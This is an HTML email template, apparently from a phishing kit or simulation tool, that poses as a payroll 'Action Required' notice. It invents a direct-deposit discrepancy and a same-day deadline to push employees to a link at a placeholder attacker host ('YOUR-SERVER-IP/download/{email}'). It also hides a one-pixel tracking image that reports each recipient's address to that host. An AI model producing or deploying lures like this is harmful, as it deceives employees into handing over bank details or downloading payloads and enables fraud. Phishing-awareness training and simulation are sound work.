<!DOCTYPE html>
<html>
<head>
<style>
    body { font-family: Arial, sans-serif; color: #333; }
    .container { max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-top: 5px solid #ff9800; }
    .content { padding: 20px; }
    .alert { color: #d9534f; font-weight: bold; }
</style>
</head>
<body>
<div class="container">
    <div class="content">
        <h3>Payroll Notification: Action Required</h3>
        <p>Dear Employee,</p>
        <p class="alert">We noticed a discrepancy in your recent direct deposit information.</p>
        
        <p>Please log in to the payroll portal immediately to verify your bank details for the upcoming pay cycle.</p>

        <p>
            <a href="http://YOUR-SERVER-IP/download/{email}">> Click here to verify your account</a>
        </p>

        <p><i>Note: If you do not verify by 5:00 PM today, your payment may be delayed.</i></p>

        <p>Regards,<br>Finance Department</p>
    </div>
    <!-- Tracking Pixel -->
    <img src="http://YOUR-SERVER-IP/image/{email}" width="1" height="1" style="display:none;">
</div>
</body>
</html>
